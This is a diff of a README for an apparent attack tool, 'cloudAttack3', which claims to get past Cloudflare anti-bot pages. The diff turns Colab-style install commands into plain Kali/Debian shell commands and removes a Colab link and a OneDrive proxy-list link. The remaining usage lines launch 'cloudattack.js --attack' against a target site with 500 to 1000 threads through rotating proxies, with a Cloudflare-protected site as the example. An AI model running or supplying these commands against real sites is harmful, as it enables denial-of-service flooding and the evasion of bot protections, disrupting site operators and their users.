@@ -26,25 +26,23 @@ In general, Cloudflare has 4 types of _common_ anti-bot pages:
   
 
 Usage
-#Install on Google Colab <a href="https://colab.research.google.com">here</a>
 ============
 ```javascript
 Install on Kali/Debian
 
-!git clone https://github.com/CryptoXSS/cloudAttack3
-%cd cloudAttack3
-!chmod +x install.sh
-!./install.sh
+git clone https://github.com/CryptoXSS/cloudAttack3
+cd cloudAttack3
+chmod +x install.sh
+./install.sh
 
 Run: node cloudattack.js --attack "yoursite" --threads 500 
 Proxys: --proxy true --updateproxy true
 
 
-Example: !node cloudattack.js --attack "https://www.acloudflaresite.com" --threads 1000 --proxy true   
+Example: node cloudattack.js --attack "https://www.acloudflaresite.com" --threads 1000 --proxy true   
 ```
 
-#Update proxy.txt
-https://1drv.ms/u/s!AoFeNfGwTmEFiHUT3F2aoCMH4_Dl?e=myTUfg
+
 
 ## Dependencias:
   - npm install 
